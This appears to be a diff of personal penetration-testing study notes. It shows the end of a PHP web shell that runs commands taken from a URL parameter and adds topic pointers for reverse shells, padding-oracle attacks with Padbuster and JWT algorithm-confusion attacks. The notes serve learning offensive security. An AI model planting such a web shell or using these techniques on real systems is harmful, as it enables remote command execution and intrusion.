@@ -4,13 +4,9 @@ $output = shell_exec($_GET['cm']);
 echo "<pre>$output</pre>"
 ?>
 ```
+- reverse shell , bash , php  , java , python
+
 - git cat-file (-t|p) $(cat master)
-### mitre att&ck 
-  - CTI : Cyber Threat Intelligence
-  - TTPS : Tactics Techniques and Procedures : 
-       - Example of ttp :  
-       
-                         - Under 5 login attemps --> ban
-                         - ttps : 4 login and create new session  
-                         - mitigation : 3 Login attemps raises SIEM alert  
-                          
+- CTI TTPs
+- Padbuster ( padding oracle ) 
+- JWT : HS256 , RS256 , none , weak secret , change algorithm (Pk to HS256 --raw openssl header included ) 
